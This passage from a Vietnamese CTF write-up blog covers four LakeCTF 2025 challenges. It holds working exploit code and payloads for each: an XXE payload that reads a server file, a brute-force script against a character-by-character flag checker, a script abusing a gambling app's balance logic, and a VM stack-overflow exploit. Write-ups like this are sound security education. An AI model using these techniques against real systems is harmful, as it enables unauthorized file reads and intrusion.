<span class="string">&quot;Sec-Fetch-Dest&quot;</span>: <span class="string">&quot;empty&quot;</span>, <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;https://chall.polygl0ts.ch:8148/&quot;</span>, <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate, br&quot;</span>, <span class="string">&quot;Priority&quot;</span>: <span class="string">&quot;u=1, i&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># cookie</span></span><br><span class="line">cookie = reset_session()</span><br><span class="line">count = <span class="number">0</span></span><br><span class="line">found = <span class="number">0</span></span><br><span class="line"><span class="comment"># gamble</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gamble</span>(<span class="params">currency</span>):</span><br><span class="line">    <span class="keyword">global</span> cookie</span><br><span class="line">    <span class="keyword">global</span> found</span><br><span class="line">    <span class="keyword">global</span> count</span><br><span class="line">    url_gamble = burp0_url + api_gamble</span><br><span class="line">    <span class="keyword">if</span> currency == <span class="string">&#x27;coins&#x27;</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            url_balance = burp0_url + api_balance</span><br><span class="line">            res_balance = requests.get(url_balance, headers=burp0_headers, cookies=burp0_cookies)</span><br><span class="line">            balances = json.loads(res_balance.text)</span><br><span class="line">            coins_balance = balances[<span class="string">&#x27;coins&#x27;</span>]</span><br><span class="line">            bet_coins = coins_balance / <span class="number">10</span> * <span class="number">9</span></span><br><span class="line">            <span class="comment"># target newblance = 9e-7</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[+] Coins balance: <span class="subst">&#123;coins_balance&#125;</span>&quot;</span>)</span><br><span class="line">            burp0_json=&#123;<span class="string">&quot;amount&quot;</span>: bet_coins , <span class="string">&quot;currency&quot;</span>: currency&#125;</span><br><span class="line">            res_gamble = requests.post(url_gamble, headers=burp0_headers, cookies=burp0_cookies, json=burp0_json)</span><br><span class="line">            gambles = json.loads(res_gamble.text)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[+] New balance coins: <span class="subst">&#123;gambles[<span class="string">&#x27;new_balance&#x27;</span>]&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> gambles[<span class="string">&#x27;new_balance&#x27;</span>] &lt;= <span class="number">9e-6</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">                </span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            url_balance = burp0_url + api_balance</span><br><span class="line">            res_balance = requests.get(url_balance, headers=burp0_headers, cookies=burp0_cookies)</span><br><span class="line">            balances = json.loads(res_balance.text)</span><br><span class="line">            usd_balance = balances[<span class="string">&#x27;usd&#x27;</span>]</span><br><span class="line">            <span class="keyword">if</span> usd_balance == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            bet_usd = balances[<span class="string">&#x27;usd&#x27;</span>]</span><br><span class="line">            burp0_json=&#123;<span class="string">&quot;amount&quot;</span>: bet_usd , <span class="string">&quot;currency&quot;</span>: currency&#125;</span><br><span class="line">            res_gamble = requests.post(url_gamble, headers=burp0_headers, cookies=burp0_cookies, json=burp0_json)</span><br><span class="line">            gambles = json.loads(res_gamble.text)</span><br><span class="line">            win = gambles[<span class="string">&#x27;win&#x27;</span>]</span><br><span class="line">            <span class="keyword">if</span> win == <span class="literal">False</span>:</span><br><span class="line">                cookie = reset_session()</span><br><span class="line">                count = <span class="number">0</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                bet_usd = gambles[<span class="string">&#x27;new_balance&#x27;</span>]</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[+] New balance usd: <span class="subst">&#123;gambles[<span class="string">&#x27;new_balance&#x27;</span>]&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> gambles[<span class="string">&#x27;new_balance&#x27;</span>] &gt;= <span class="number">8</span>:</span><br><span class="line">                <span class="comment"># 0 times padding</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;!!!!!!!!!!!!!&quot;</span>)</span><br><span class="line">                <span class="comment"># found = 1</span></span><br><span class="line">            <span class="keyword">if</span> gambles[<span class="string">&#x27;new_balance&#x27;</span>] &gt;= <span class="number">10</span>:</span><br><span class="line">                url_flag = burp0_url + api_flag</span><br><span class="line">                res_flag = requests.post(url_flag, headers=burp0_headers, cookies=burp0_cookies)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[*] Flag: <span class="subst">&#123;res_flag.text&#125;</span>&quot;</span>)</span><br><span class="line">                found = <span class="number">1</span></span><br><span class="line"><span class="comment"># convert</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">convert</span>():</span><br><span class="line">    url_balance = burp0_url + api_balance</span><br><span class="line">    res_balance = requests.get(url_balance, headers=burp0_headers, cookies=burp0_cookies)</span><br><span class="line">    balances = json.loads(res_balance.text)</span><br><span class="line">    coins_balance = balances[<span class="string">&#x27;coins&#x27;</span>]</span><br><span class="line">    url = burp0_url + api_convert</span><br><span class="line">    burp0_json=&#123;<span class="string">&quot;amount&quot;</span>: coins_balance&#125;</span><br><span class="line">    r = requests.post(url, headers=burp0_headers, cookies=burp0_cookies, json=burp0_json)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] Convert: <span class="subst">&#123;r.text&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="comment"># init</span></span><br><span class="line">    burp0_cookies = &#123;<span class="string">&quot;connect.sid&quot;</span>: cookie&#125;</span><br><span class="line">    gamble(<span class="string">&quot;coins&quot;</span>)</span><br><span class="line">    convert()</span><br><span class="line">    gamble(<span class="string">&quot;usd&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> found == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>Ta có thể mở nhiều terminal chạy script nhằm tăng khả năng có được flag.</li>
+</ul>
+<blockquote>
+<blockquote>
+<p>Flag: EPFL{we_truly_live_in_a_society}</p>
+</blockquote>
+</blockquote>
+<h1 id="Web-Challenge-Le-Canard-du-Lac"><a href="#Web-Challenge-Le-Canard-du-Lac" class="headerlink" title="Web | Challenge: Le Canard du Lac"></a>Web | Challenge: Le Canard du Lac</h1><ul>
+<li>Challenge này tương đối đơn giản, bug nằm ở <code>/rss.php</code> cho phép render <code>xml</code> do người dùng truyền vào và dẫn đến kẻ tấn công có thể thực hiện công tấn <code>XXE</code> và đọc được flag tại <code>/flag.txt</code> trong server.</li>
+<li>Dưới đây là payload:</li>
+</ul>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [<span class="meta">&lt;!ENTITY <span class="keyword">test</span> <span class="keyword">SYSTEM</span> <span class="string">&#x27;file:///flag.txt&#x27;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;test;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/ctf/lakectf/1.png" alt="Le Canard du Lac"></p>
+<blockquote>
+<blockquote>
+<p>Flag: EPFL{l4k3_LEMAN_myster1es_@_epfl!}</p>
+</blockquote>
+</blockquote>
+<h1 id="Crypto-Challenge-Guess-Flag"><a href="#Crypto-Challenge-Guess-Flag" class="headerlink" title="Crypto | Challenge: Guess Flag"></a>Crypto | Challenge: Guess Flag</h1><ul>
+<li>Challenge này chỉ đơn giản là bruteforce flag thôi</li>
+<li>Phân tích file <code>Guessflag.py</code> mã nguồn của chương trình:</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env -S python3 -u</span></span><br><span class="line">flag = <span class="string">&quot;00000000000000000000000000000000&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Don&#x27;t even think to guess the flag by brute force, it is 32 digits long!&quot;</span>)</span><br><span class="line"></span><br><span class="line">user_input = <span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> user_input.isdigit():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Flag only contains digits!&quot;</span>)</span><br><span class="line">    exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">index = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> user_input:</span><br><span class="line">    <span class="keyword">if</span> char != flag[index]:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Wrong flag!&quot;</span>)</span><br><span class="line">        exit()</span><br><span class="line">    index += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Correct flag!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;flag is : EPFL&#123;&quot;</span> +user_input + <span class="string">&quot;&#125;&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>Dòng: <code>print(&quot;Don&#39;t even think to guess the flag by brute force, it is 32 digits long!&quot;)</code> cho ta biết được flag dài 32 ký tự và các ký tự chỉ có các chữ số.</li>
+<li>Dưới đây là script để bruteforce được nội dung của flag:</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">count = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> count &lt;= <span class="number">32</span>:</span><br><span class="line">    log.info(<span class="string">f&quot;Current index: <span class="subst">&#123;count&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> string.digits:</span><br><span class="line">        p = remote(<span class="string">&#x27;chall.polygl0ts.ch&#x27;</span>, <span class="number">6001</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;long!\n&#x27;</span>, <span class="string">f&#x27;<span class="subst">&#123;flag + c&#125;</span>&#x27;</span>.encode())</span><br><span class="line">        res = p.recvline()</span><br><span class="line">        <span class="built_in">print</span>(res)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&quot;Correct flag!&quot;</span> <span class="keyword">in</span> res:</span><br><span class="line">            flag += c</span><br><span class="line">            log.info(<span class="string">f&quot;Flag content: <span class="subst">&#123;flag + c&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    count += <span class="number">1</span></span><br><span class="line">log.success(<span class="string">&quot;Flag: EPFL&#123;&quot;</span> + flag + <span class="string">&#x27;&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<blockquote>
+<p>Flag: EPFL{15392948299929328383828399923990}</p>
+</blockquote>
+</blockquote>
+<h1 id="Pwn-Challenge-stackception-1"><a href="#Pwn-Challenge-stackception-1" class="headerlink" title="Pwn | Challenge: stackception-1"></a>Pwn | Challenge: stackception-1</h1><h2 id="1-Y-nghia-tung-file"><a href="#1-Y-nghia-tung-file" class="headerlink" title="1. Ý nghĩa từng file"></a>1. Ý nghĩa từng file</h2><p>[+] file <code>chall.py</code>:</p>
+<ul>
+<li><p>Là <strong>keo dán</strong> toàn bộ bài:</p>
+<ul>
+<li>Nhận một dòng input từ user.</li>
+<li>Đổi _ → khoảng trắng, | → xuống dòng → ra file <code>input.asm</code>.</li>
+</ul>
+</li>
+<li><p>Gọi <code>stackception-asm</code> để dịch <code>input.asm</code> → <code>out.bin</code>.</p>
+</li>
+<li><p>Gọi stackception (VM) để chạy <code>out.bin</code>.</p>
+</li>
+<li><p>Nên mình không nói chuyện trực tiếp với VM, mà phải viết <strong>asm</strong> theo đúng format:</p>
+</li>
+<li><p>Ví dụ:<br>→ gửi: <code>push_1|push_2|add</code></p>
+</li>
+</ul>
+<p>[+] file <code>stackception-asm</code>:</p>
+<ul>
+<li><p>Là assembler: chuyển code asm của mình thành bytecode cho VM.</p>
+</li>
+<li><p>Nó hỗ trợ:</p>
+<ul>
+<li>Lệnh dạng: push 123, add, mul, call main, jmp loop, v.v.</li>
+<li>Label: main:, loop:, …</li>
+</ul>
+</li>
+<li><p><code>jmp label / call label</code> sẽ được nó tự expand thành:<code>push &lt;địa_chỉ_label&gt;</code></p>
+</li>
+<li><p>rồi mới <code>jmp / call</code></p>
+</li>
+</ul>
+<p>[+] file <code>stackception-1</code>: (VM)</p>
+<ul>
+<li><p>Đây là chỗ chạy bytecode. Có:</p>
+<ul>
+<li>data stack (stack dữ liệu),</li>
+<li>call stack (stack return address), mảng chứa bytecode (s).</li>
+</ul>
+</li>
+<li><p>Các opcode chính:</p>
+</li>
+</ul>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">0 – cộng (ADD)</span><br><span class="line"></span><br><span class="line">1 – nhân (MUL)</span><br><span class="line"></span><br><span class="line">2 – PUSH</span><br><span class="line"></span><br><span class="line">3 – POP</span><br><span class="line"></span><br><span class="line">4 – DUP</span><br><span class="line"></span><br><span class="line">5 – JMP</span><br><span class="line"></span><br><span class="line">6 – CALL</span><br><span class="line"></span><br><span class="line">7 – RET</span><br><span class="line"></span><br><span class="line">8 – READ (đọc 4 byte từ stdin, PUSH)</span><br><span class="line"></span><br><span class="line">9 – WRITE</span><br><span class="line"></span><br><span class="line">10 – EXIT</span><br><span class="line"></span><br><span class="line">11 – FLAG: đọc /app/flag.txt và in Flag</span><br></pre></td></tr></table></figure>
+
+<p><strong>1. Bug &amp; ý tưởng chính</strong></p>
+<p>Có hai ý chính:</p>
+<p><strong>(1) PUSH overflow sang code</strong></p>
+<ul>
+<li><p>Data stack và vùng code nằm liền nhau trong bộ nhớ.</p>
+</li>
+<li><p>Lệnh PUSH không check tràn:</p>
+</li>
+<li><p>Khi stack còn nhỏ → viết đúng vào vùng stack.</p>
+</li>
+<li><p>Khi stack đủ lớn → viết đè sang vùng bytecode.</p>
+</li>
+</ul>
+<blockquote>
+<p>Nghĩa là: dùng đủ nhiều push, ta có thể sửa chính chương trình đang chạy (self-modifying code).</p>
+</blockquote>
+<p><strong>(2) Một số lệnh đọc “top of stack” từ nhầm chỗ</strong></p>
+<ul>
+<li><p>Các lệnh như jmp, call, write, exit không đọc từ data stack, mà lại đọc từ một mảng khác bị chồng địa chỉ với: data stack và cả vùng code.</p>
+</li>
+<li><p>Khi stack vừa phải → vô tình vẫn đọc đúng (vì chồng lên data stack).</p>
+</li>
+<li><p>Khi stack quá lớn → nó bắt đầu đọc nhầm sang bytecode.</p>
+</li>
+<li><p>Kết quả:</p>
+<ul>
+<li>Nhảy (jmp&#x2F;call) tới địa chỉ lấy từ bytecode mình vừa overwrite.</li>
+<li>exit cũng return giá trị từ bytecode.</li>
+</ul>
+</li>
+</ul>
+<ol>
+<li>Exploit idea:</li>
+</ol>
+<ul>
+<li><p>Dùng rất nhiều push 0 (khoảng 512 lần)<br>→ làm stack cao đến mức PUSH bắt đầu ghi đè từ instruction đầu tiên trong vùng bytecode.</p>
+</li>
+<li><p>Tiếp tục push để ghi đè:</p>
+<ul>
+<li>Ghi opcode của instruction 0 thành 11 (FLAG).</li>
+<li>Ghi giá trị tiếp theo thành 0 (để dùng làm “PC target” – nơi sẽ nhảy về, là instruction 0).</li>
+</ul>
+</li>
+<li><p>Gọi call (hoặc jmp) không có operand khi stack đang rất to:</p>
+</li>
+<li><p>Do bug, VM sẽ lấy địa chỉ nhảy từ vùng bytecode (chứ không phải từ stack “đúng”).</p>
+</li>
+<li><p>Mà ta đã sửa bytecode đó thành 0 → PC &#x3D; 0.</p>
+</li>
+<li><p>Chương trình chạy lại từ instruction 0, nhưng Instruction 0 giờ là opcode 11 (FLAG).</p>
+</li>
+<li><p>VM đọc flag, in Flag: …, xong!</p>
+</li>
+<li><p>Toàn bộ exploit chỉ xoay quanh:</p>
+<ul>
+<li>Đẩy nhiều PUSH để tràn vào vùng code.</li>
+<li>Sửa opcode đầu thành FLAG,</li>
+<li>Dùng bug nhảy đến code mình vừa sửa.</li>
+</ul>
+</li>
+<li><p>Thế là win.</p>
+</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_asm</span>():</span><br><span class="line">    lines = [<span class="string">&quot;push 0&quot;</span>] * <span class="number">512</span></span><br><span class="line">    lines += [<span class="string">&quot;push 11&quot;</span>, <span class="string">&quot;push 0&quot;</span>, <span class="string">&quot;call&quot;</span>]</span><br><span class="line">    asm = <span class="string">&quot;\n&quot;</span>.join(lines)</span><br><span class="line">    <span class="keyword">return</span> asm.replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;_&quot;</span>).replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;|&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(build_asm())</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>Chạy script trên và lấy payload trả về rồi gửi lên server để lấy flag.</li>
+</ul>
+<p><img src="/img/ctf/lakectf/2.png" alt="stackception-1"></p>
+<blockquote>
+<blockquote>
+<p>Flag: EPFL{stack-the-planet!}</p>
+</blockquote>
+</blockquote>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://elliotbigfan.github.io">H00d1eBl4ck</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://elliotbigfan.github.io/2025/12/01/2025/ctf/LakeCTF/wu/">https://elliotbigfan.github.io/2025/12/01/2025/ctf/LakeCTF/wu/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a><a class="post-meta__tags" href="/tags/Web/">Web</a><a class="post-meta__tags" href="/tags/Pwn/">Pwn</a><a class="post-meta__tags" href="/tags/Crypto/">Crypto</a></div><div class="post-share"><div class="social-share" data-image="/img/ctf/lakectf/poster.webp" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2025/11/11/2025/ctf/Infobahn/wu/" title="Writeup: Infobahn 2025"><img class="cover" src="/img/ctf/infobahn/poster.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">Writeup: Infobahn 2025</div></div><div class="info-2"><div class="info-item-1">Beginner (Web) | Challenge: Bitset, Bitsets và Bitsetsy Các challenges này tác giả đã cố tình để unintended :&gt;   Mình chỉ cần truy cập /run.sh là lấy đc flag cho cả 3 bài :&gt;    Ở các challenge revenge sau sẽ bỏ đi unintended này và cần phải hack thật sự.  Beginner (Web) | Challenge: Bitset-revenge, Bitsets-revengeBitset-revenge Chall này validate không an toàn ở param url và truyền giá trị url này vào thuộc tính src của tag img dẫn đến kẻ tấn công có thể bypass và gây ra xss lấy flag đư...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/11/11/2025/ctf/Infobahn/wu/" title="Writeup: Infobahn 2025"><img class="cover" src="/img/ctf/infobahn/poster.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-11</div><div class="info-item-2">Writeup: Infobahn 2025</div></div><div class="info-2"><div class="info-item-1">Beginner (Web) | Challenge: Bitset, Bitsets và Bitsetsy Các challenges này tác giả đã cố tình để unintended :&gt;   Mình chỉ cần truy cập /run.sh là lấy đc flag cho cả 3 bài :&gt;    Ở các challenge revenge sau sẽ bỏ đi unintended này và cần phải hack thật sự.  Beginner (Web) | Challenge: Bitset-revenge, Bitsets-revengeBitset-revenge Chall này validate không an toàn ở param url và truyền giá trị url này vào thuộc tính src của tag img dẫn đến kẻ tấn công có thể bypass và gây ra xss lấy flag đư...</div></div></div></a><a class="pagination-related" href="/2025/09/25/2025/ctf/cyberconDTU/writeup/" title="Writeup: cyberconDTU 2025"><img class="cover" src="/img/ctf/cybercon/poster_cybercon.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-09-25</div><div class="info-item-2">Writeup: cyberconDTU 2025</div></div><div class="info-2"><div class="info-item-1">Web | Safe upload file1. Phân tích mã nguồn và ý tưởng Đọc qua file .yar (validate file upload), ta có thể thấy các file khi đc upload lên server sẽ được file .yar này validate rất chặt và gần như không thể bypass để upload webshell được. Tuy nhiên, khi phân tích file upload.php ta có thể thấy một số đoạn code xử lý không hợp lý và dẫn đến upload file race condition.  1234567891011// move file vào thư mục $tmp_path(/var/www/html/tmp) if (!move_uploaded_file($_FILES[&#x27;file&#x27;][&#x27;tmp...</div></div></div></a><a class="pagination-related" href="/2025/10/02/2025/ctf/holactf/writeup/" title="Writeup: HolaCTF 2025"><img class="cover" src="/img/ctf/holactf/poster.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-10-02</div><div class="info-item-2">Writeup: HolaCTF 2025</div></div><div class="info-2"><div class="info-item-1">Web | Hell EHCIntroduction Đây là một challenge liên quan đến lỗ hổng Deserialization và Wrapper phar:&#x2F;&#x2F; trong PHP (PHP Phar deserialization) Link tải challenge: hell-ehc Cách chạy challenge:  12345# 1. build imagedocker build -t hell_ehc .# 2. Run containerdocker run -it --rm -p 5005:80 hell_ehc  Solution1. Xác định vị trí xảy ra lỗi bảo mật trong mã nguồn Vì challenge có cho tính năng upload file nên ta sẽ thử kiểm tra liệu có thể tận dụng điều này để upload trực tiếp webshell và ...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/favicon_io/android-chrome-192x192.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">H00d1eBl4ck</div><div class="author-info-description">Thuan Le</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">6</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">8</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/ElliotBigFan"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/ElliotBigFan" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">I'm trying to be better</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-Challenge-Gamblecore"><span class="toc-number">1.</span> <span class="toc-text">Web | Challenge: Gamblecore</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-Challenge-Le-Canard-du-Lac"><span class="toc-number">2.</span> <span class="toc-text">Web | Challenge: Le Canard du Lac</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Crypto-Challenge-Guess-Flag"><span class="toc-number">3.</span> <span class="toc-text">Crypto | Challenge: Guess Flag</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pwn-Challenge-stackception-1"><span class="toc-number">4.</span> <span class="toc-text">Pwn | Challenge: stackception-1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-Y-nghia-tung-file"><span class="toc-number">4.1.</span> <span class="toc-text">1. Ý nghĩa từng file</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/12/01/2025/ctf/LakeCTF/wu/" title="Writeup: LakeCTF 2025"><img src="/img/ctf/lakectf/poster.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Writeup: LakeCTF 2025"/></a><div class="content"><a class="title" href="/2025/12/01/2025/ctf/LakeCTF/wu/" title="Writeup: LakeCTF 2025">Writeup: LakeCTF 2025</a><time datetime="2025-12-01T07:09:56.000Z" title="Created 2025-12-01 14:09:56">2025-12-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/11/11/2025/ctf/Infobahn/wu/" title="Writeup: Infobahn 2025"><img src="/img/ctf/infobahn/poster.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Writeup: Infobahn 2025"/></a><div class="content"><a class="title" href="/2025/11/11/2025/ctf/Infobahn/wu/" title="Writeup: Infobahn 2025">Writeup: Infobahn 2025</a><time datetime="2025-11-11T03:31:26.000Z" title="Created 2025-11-11 10:31:26">2025-11-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/10/02/2025/ctf/holactf/writeup/" title="Writeup: HolaCTF 2025"><img src="/img/ctf/holactf/poster.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Writeup: HolaCTF 2025"/></a><div class="content"><a class="title" href="/2025/10/02/2025/ctf/holactf/writeup/" title="Writeup: HolaCTF 2025">Writeup: HolaCTF 2025</a><time datetime="2025-10-02T07:18:22.000Z" title="Created 2025-10-02 14:18:22">2025-10-02</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/09/27/Experiences/XSS/xss/" title="Experience: Cross Side Script (XSS)"><img src="/img/experience/xss.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Experience: Cross Side Script (XSS)"/></a><div class="content"><a class="title" href="/2025/09/27/Experiences/XSS/xss/" title="Experience: Cross Side Script (XSS)">Experience: Cross Side Script (XSS)</a><time datetime="2025-09-27T11:12:56.000Z" title="Created 2025-09-27 18:12:56">2025-09-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/09/25/2025/ctf/cyberconDTU/writeup/" title="Writeup: cyberconDTU 2025"><img src="/img/ctf/cybercon/poster_cybercon.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Writeup: cyberconDTU 2025"/></a><div class="content"><a class="title" href="/2025/09/25/2025/ctf/cyberconDTU/writeup/" title="Writeup: cyberconDTU 2025">Writeup: cyberconDTU 2025</a><time datetime="2025-09-25T09:12:34.000Z" title="Created 